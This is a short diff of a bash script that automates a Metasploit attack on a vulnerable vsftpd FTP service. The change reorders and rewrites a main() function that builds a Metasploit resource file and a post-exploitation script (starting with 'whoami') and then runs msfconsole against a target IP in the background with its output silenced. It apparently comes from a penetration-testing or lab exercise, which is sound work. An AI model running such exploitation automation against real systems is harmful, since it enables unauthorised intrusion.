@@ -5,17 +5,6 @@ msfScriptPath=/tmp/insideMsf
 
 mkdir -p $msfScriptPath
 
-main() {
-    echo "[PREPARING SCRIPTS...]"
-    sleep 2
-
-    generateMetasploitResource
-    generatePostExploitationScript
-
-    echo "[RUNNING METASPLOIT ON TARGET $targetIpAddress]"
-    msfconsole -r $msfScriptPath/vsftpd.rc && echo "done"
-}
-
 generatePostExploitationScript() {
 	cat <<EOF > $msfScriptPath/payload.rc
 	whoami
@@ -32,6 +21,21 @@ generateMetasploitResource() {
     run
     exit
 EOF
+}
+
+main() {
+    echo "[!] Starting Exploitation Script..."
+    sleep 2
+
+    echo "[!] Generating Metasploit Resources..."
+    generateMetasploitResource
+    echo "[!] Generating Post Exploitations Resources..."
+    generatePostExploitationScript
+
+    echo "[!] Exploiting Vulnerable FTP Service On $targetIpAddress]"
+    msfconsole -r $msfScriptPath/vsftpd.rc &> /dev/null &
+
+    echo "[!] Exploitation Finished!"
 }
 
 main
